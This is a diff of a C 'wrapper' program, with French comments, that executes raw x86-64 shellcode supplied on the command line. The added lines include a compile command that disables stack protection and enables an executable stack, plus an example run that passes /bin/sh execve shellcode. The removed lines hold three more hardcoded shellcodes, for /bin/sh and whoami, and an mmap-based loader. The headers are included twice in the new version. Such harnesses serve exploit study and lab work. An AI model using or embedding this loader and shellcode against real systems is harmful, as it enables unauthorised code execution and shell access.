@@ -1,32 +1,40 @@
+//COMPILATION : gcc  wrapper/wrapper.c -o wrapper/wrapper -fno-stack-protector -z execstack -m64
+//EXECUTION EXEMPLE : ./wrapper/wrapper $(python2 -c "print('\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05')")
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
-#include <sys/mman.h>
-#include <stddef.h>
+#include <unistd.h>
 
-/*shellcodes testés :   /bin/sh "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
-                        /bin/sh "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
-                        whoami "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f"
-*/
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
 int main(int argc, char *argv[]) {
-    size_t shellcode_len = 0;
+  // Controle du nombre d'arguments
+  if (argc < 2) {
+    printf("usage : ./wrapper $(python2 -c \"print(\'SHELLCODE\')\")\n");
+    return 1;
+  }
+  
+  char *shellcode = argv[1];
+  
+  // Affichage de la taille du shellcode
+  size_t shellcode_len = strlen(shellcode);
+  printf("Shellcode size: %ld\n", shellcode_len);
 
-    /*
-        unsigned char shellcode[] : variable shellcode à changer en fonction du résultat que nous voulons
-    */
-    unsigned char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
+  // Affichage du shellcode
+  printf("Shellcode: ");
+  for (size_t i = 0; i < shellcode_len; i++) {
+    printf("\\x%02x", (unsigned char)shellcode[i]);
+  }
+  printf("\n");
 
-    shellcode_len = sizeof(shellcode);
+  // Execution du shellcode
+  printf("Executing shellcode...\n");
+  int (*func)();
+  func = (int (*)()) shellcode;
+  (int)(*func)();
 
-    void *shellcode_mem = mmap(0, shellcode_len, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
-    if (shellcode_mem == MAP_FAILED) {
-        perror("mmap");
-        return 1;
-    }
-
-    memcpy(shellcode_mem, shellcode, shellcode_len);
-    ((void (*)())shellcode_mem)();
-
-
-    return 0;
+  return 0;
 }
